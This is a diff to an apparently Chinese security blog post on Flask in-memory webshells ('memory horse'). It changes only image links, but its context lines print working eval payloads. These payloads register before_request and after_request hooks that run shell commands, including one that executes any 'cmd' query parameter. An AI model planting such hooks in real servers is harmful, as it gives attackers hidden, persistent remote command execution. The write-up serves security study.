@@ -40,12 +40,15 @@ ssti:
 通过@app.before_request @app.after_request来打
 ```
 
-![image-20240515013354373](../Memory-Horse-in-Flask/image-20240515013354373.png)
+
+<!--more-->
+
+![image-20240515013354373](./image-20240515013354373.png)
 
 就是在请求之前做一些操作
 看看这个装饰器
 
-![image-20240515013857705](../Memory-Horse-in-Flask/image-20240515013857705.png)
+![image-20240515013857705](./image-20240515013857705.png)
 
 ```
 before_request_funcs.setdefault(None, []).append(f)
@@ -57,14 +60,14 @@ payload
 eval("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('dir').read())")
 ```
 
-![image-20240515013404680](../Memory-Horse-in-Flask/image-20240515013404680.png)
+![image-20240515013404680](./image-20240515013404680.png)
 
 ```
 eval("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)")
 
 ```
 
-![image-20240515015200446](../Memory-Horse-in-Flask/image-20240515015200446.png)
+![image-20240515015200446](./image-20240515015200446.png)
 
 发现大佬通过其它hook也能打入
 
